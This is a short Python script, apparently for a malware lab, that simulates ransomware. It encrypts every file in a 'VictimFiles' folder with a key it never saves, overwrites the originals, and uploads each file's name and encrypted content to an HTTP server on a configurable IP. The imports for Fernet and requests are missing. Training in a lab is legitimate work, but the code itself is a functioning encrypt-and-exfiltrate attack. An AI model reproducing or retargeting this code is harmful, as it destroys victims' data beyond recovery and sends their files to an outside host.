import os


from datetime import datetime

# Victim files path on Drive C
VICTIM_FOLDER = "C:\\MalwareLab\\VictimFiles"
LOG_FILE = "C:\\MalwareLab\\malware_log.txt"

# ===== IMPORTANT: Configure this with your SERVER LAPTOP IP =====
# On SERVER laptop, run: ipconfig (Windows) and find IPv4 Address
# Example: "192.168.x.x" or "10.x.x.x"
SERVER_IP = "192.168.1.100"  # <-- CHANGE THIS to your server's IP
API_URL = f"http://{SERVER_IP}:5000/upload"

# Generate encryption key (simulation)
key = Fernet.generate_key()
cipher = Fernet(key)

def log(message):
    with open(LOG_FILE, "a") as f:
        f.write(f"{datetime.now()} — {message}\n")

log("Simulation started!")

for filename in os.listdir(VICTIM_FOLDER):
    file_path = os.path.join(VICTIM_FOLDER, filename)

    if os.path.isfile(file_path):
        with open(file_path, "r") as file:
            data = file.read()

        # Encrypt file content
        encrypted_data = cipher.encrypt(data.encode())
        with open(file_path, "wb") as file:
            file.write(encrypted_data)

        log(f"Encrypted file: {filename}")

        # Send encrypted data
        try:
            response = requests.post(API_URL, json={
                "filename": filename,
                "content": encrypted_data.decode()
            })
            log(f"Transfer success: {filename}")
        except Exception as e:
            log(f"Transfer FAILED: {filename} — {str(e)}")

log("Simulation Finished")
print("Files Encrypted + Transfer Attempted")
